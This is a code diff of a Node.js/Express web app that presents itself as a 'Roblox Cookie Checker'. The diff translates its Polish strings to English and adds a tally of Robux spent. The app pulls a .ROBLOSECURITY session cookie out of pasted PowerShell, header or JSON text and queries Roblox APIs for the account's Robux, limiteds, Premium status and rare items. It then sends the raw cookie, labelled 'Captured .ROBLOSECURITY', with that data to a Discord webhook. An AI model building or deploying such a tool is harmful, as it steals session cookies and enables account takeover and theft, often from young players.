@@ -4,11 +4,11 @@ const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Strona główna – HTML + JS
+// Main page – HTML + JS frontend
 app.get('/', (req, res) => {
   res.send(`
 <!DOCTYPE html>
-<html lang="pl">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -29,10 +29,10 @@ app.get('/', (req, res) => {
 </head>
 <body>
 <div class="container">
-  <h1>Roblox Cookie Checker (automatyczne wyciąganie)</h1>
-  <p>Wklej dowolny tekst (PowerShell, konsola, headers, JSON itp.)<br>Cookie zostanie wyciągnięte automatycznie</p>
-  <textarea id="input" placeholder="Wklej tutaj cały fragment tekstu..."></textarea>
-  <button onclick="check()">Sprawdź i wyślij na webhook</button>
+  <h1>Roblox Cookie Checker (auto extraction)</h1>
+  <p>Paste any text (PowerShell, console, headers, JSON etc.)<br>Cookie will be extracted automatically</p>
+  <textarea id="input" placeholder="Paste your text here..."></textarea>
+  <button onclick="check()">Check & Send to Webhook</button>
   <div id="result"></div>
 </div>
 
@@ -43,37 +43,41 @@ async function check() {
   result.innerHTML = '';
 
   if (!raw) {
-    result.innerHTML = '<span class="error">Nic nie wklejono</span>';
+    result.innerHTML = '<span class="error">Nothing pasted</span>';
     return;
   }
 
   let cookie = null;
   let match;
 
+  // 1. PowerShell / .NET format
   match = raw.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
   if (match && match[1]) cookie = match[1].trim();
 
+  // 2. Classic -and-items.|_
   if (!cookie) {
     match = raw.match(/-and-items\.\|_(.*?)(?=")/s);
     if (match && match[1]) cookie = match[1].trim();
   }
 
+  // 3. Long warning string
   if (!cookie) {
     match = raw.match(/_\\|WARNING[^"]{200,}/);
     if (match) cookie = match[0].trim();
   }
 
+  // 4. Fallback – longest string starting with _
   if (!cookie) {
     const fallback = raw.match(/_[\\w\\-|]{180,}/g) || [];
     if (fallback.length) cookie = fallback.reduce((a, b) => a.length > b.length ? a : b).trim();
   }
 
   if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
-    result.innerHTML = '<span class="error">Nie znaleziono poprawnego .ROBLOSECURITY w tekście</span>';
+    result.innerHTML = '<span class="error">No valid .ROBLOSECURITY found in text</span>';
     return;
   }
 
-  result.innerHTML = '<span class="loading">Znaleziono cookie – sprawdzam i wysyłam na webhook...</span>';
+  result.innerHTML = '<span class="loading">Cookie found – checking and sending to webhook...</span>';
 
   try {
     const res = await fetch('/check', {
@@ -82,15 +86,15 @@ async function check() {
       body: JSON.stringify({ cookie })
     });
 
-    if (!res.ok) throw new Error('Błąd serwera: ' + res.status);
+    if (!res.ok) throw new Error('Server error: ' + res.status);
     const json = await res.json();
 
     if (json.error) {
-      result.innerHTML = \`<span class="error">Błąd: \${json.error}</span>\`;
+      result.innerHTML = \`<span class="error">Error: \${json.error}</span>\`;
       return;
     }
 
-    let html = \`<span class="success">Konto sprawdzone i wysłane na webhook!</span><br><br>\`;
+    let html = \`<span class="success">Account checked and sent to webhook!</span><br><br>\`;
     if (json.avatarUrl) html += \`<img id="avatar" src="\${json.avatarUrl}" alt="Avatar"><br>\`;
 
     html += \`
@@ -105,11 +109,12 @@ async function check() {
       <b>AMP:</b> \${json.ampCount || 0}<br>
       <b>SAB:</b> \${json.sabCount || 0}<br>
       <b>JB:</b> \${json.jbCount || 0}<br>
+      <b>Robux Spent (last 12 months):</b> \${json.totalSpentLastYear?.toLocaleString('en-US') || 0}<br>
     \`;
 
     result.innerHTML = html;
   } catch (err) {
-    result.innerHTML = \`<span class="error">Błąd: \${err.message}</span>\`;
+    result.innerHTML = \`<span class="error">Error: \${err.message}</span>\`;
   }
 }
 </script>
@@ -118,6 +123,7 @@ async function check() {
   `);
 });
 
+// Main check endpoint
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
 
@@ -126,7 +132,7 @@ app.post('/check', async (req, res) => {
   }
 
   try {
-    // CSRF Token
+    // Get CSRF Token
     const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
       method: 'POST',
       headers: {
@@ -137,7 +143,7 @@ app.post('/check', async (req, res) => {
     const csrfToken = tokenRes.headers.get('x-csrf-token');
     if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token');
 
-    // Dane użytkownika
+    // Get authenticated user data
     const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
       headers: {
         'Cookie': `.ROBLOSECURITY=${cookie}`,
@@ -148,7 +154,7 @@ app.post('/check', async (req, res) => {
     if (!userRes.ok) throw new Error('Invalid cookie');
     const userData = await userRes.json();
 
-    // Email Verified (via hat)
+    // Email Verified (via Verified Email Badge)
     let emailVerified = false;
     try {
       const ownsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`, {
@@ -160,7 +166,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Premium
+    // Premium status
     let hasPremium = false;
     try {
       const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
@@ -169,7 +175,7 @@ app.post('/check', async (req, res) => {
       if (premiumRes.ok) hasPremium = await premiumRes.json();
     } catch {}
 
-    // Robux
+    // Current Robux balance
     let robux = 0;
     try {
       const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
@@ -181,7 +187,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // RAP
+    // RAP (Recent Average Price of limiteds)
     let rap = 0;
     try {
       const assetsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?sortOrder=Asc&limit=100`, {
@@ -193,7 +199,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Groups Owned
+    // Groups owned (owner rank 255)
     let groupsOwned = 0;
     try {
       const groupsRes = await fetch(`https://groups.roblox.com/v2/users/${userData.id}/groups/roles`, {
@@ -205,7 +211,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Wiek konta
+    // Account age
     let accountAgeDays = 0;
     let createdDate = null;
     try {
@@ -219,7 +225,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Avatar
+    // Avatar thumbnail
     let avatarUrl = null;
     try {
       const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
@@ -229,7 +235,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Gamepasy
+    // Gamepasses
     const mm2Ids = [429957, 1308795];
     const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
     const sabIds = [1227013099, 1229510262, 1228591447];
@@ -265,7 +271,7 @@ app.post('/check', async (req, res) => {
     const sabCount = hasGamePasses.filter(id => sabIds.includes(id)).length;
     const jbCount  = hasGamePasses.filter(id => jbIds.includes(id)).length;
 
-    // Headless i Korblox
+    // Headless & Korblox
     let hasHeadless = false;
     let hasKorblox = false;
     try {
@@ -288,6 +294,51 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
+    // Total Robux spent in the last 12 months
+    let totalSpentLastYear = 0;
+    let cursor = null;
+    const oneYearAgo = new Date();
+    oneYearAgo.setFullYear(oneYearAgo.getFullYear() - 1);
+
+    try {
+      do {
+        const url = `https://economy.roblox.com/v2/users/${userData.id}/transactions?transactionType=Purchase&limit=100` +
+                    (cursor ? `&cursor=${encodeURIComponent(cursor)}` : '');
+
+        const txRes = await fetch(url, {
+          headers: {
+            'Cookie': `.ROBLOSECURITY=${cookie}`,
+            'X-CSRF-TOKEN': csrfToken,
+            'Accept': 'application/json'
+          }
+        });
+
+        if (!txRes.ok) break;
+
+        const txData = await txRes.json();
+
+        if (txData.data && Array.isArray(txData.data)) {
+          let shouldBreak = false;
+          for (const tx of txData.data) {
+            const txDate = new Date(tx.created);
+            if (txDate < oneYearAgo) {
+              shouldBreak = true;
+              break;
+            }
+
+            if (tx.amountInRobux < 0) {
+              totalSpentLastYear += Math.abs(tx.amountInRobux);
+            }
+          }
+          if (shouldBreak) break;
+        }
+
+        cursor = txData.nextPageCursor;
+      } while (cursor);
+    } catch (e) {
+      console.error('Transactions fetch error:', e.message);
+    }
+
     const result = {
       success: true,
       username: userData.name,
@@ -305,10 +356,11 @@ app.post('/check', async (req, res) => {
       mm2Count,
       ampCount,
       sabCount,
-      jbCount
+      jbCount,
+      totalSpentLastYear
     };
 
-    // Wysyłka webhook – dwa embedy
+    // Send to Discord webhook (two embeds)
     const webhookUrl = process.env.WEBHOOK;
     if (webhookUrl) {
       try {
@@ -317,7 +369,6 @@ app.post('/check', async (req, res) => {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             embeds: [
-              // Embed 1 – informacje o koncie
               {
                 color: 0x0F0F23,
                 title: `<:User:1481761037257674872> ${userData.name}`,
@@ -349,6 +400,11 @@ app.post('/check', async (req, res) => {
                     inline: true
                   },
                   {
+                    name: "**Spending**",
+                    value: `Robux Spent (last 12 months): **${totalSpentLastYear.toLocaleString('en-US')}**`,
+                    inline: true
+                  },
+                  {
                     name: "**Inventory**",
                     value:
                       `<:Korblox:1481770192500424775> Korblox: **${hasKorblox ? 'True' : 'False'}**\n` +
@@ -357,14 +413,13 @@ app.post('/check', async (req, res) => {
                   }
                 ],
                 footer: {
-                  text: "24H! • " + new Date().toLocaleString('pl-PL')
+                  text: "24H! • " + new Date().toLocaleString('en-US')
                 },
                 timestamp: new Date().toISOString()
               },
-              // Embed 2 – cookie
               {
                 color: 0x4B0082,
-                title: "Wyłapane .ROBLOSECURITY",
+                title: "Captured .ROBLOSECURITY",
                 description: `\`\`\`\n${cookie}\n\`\`\``,
                 timestamp: new Date().toISOString()
               }
@@ -372,7 +427,7 @@ app.post('/check', async (req, res) => {
           })
         });
       } catch (e) {
-        console.error("Błąd wysyłki webhook:", e.message);
+        console.error("Webhook send error:", e.message);
       }
     }
 
@@ -386,5 +441,5 @@ app.post('/check', async (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-  console.log(`Serwer działa na porcie ${PORT}`);
+  console.log(`Server running on port ${PORT}`);
 });
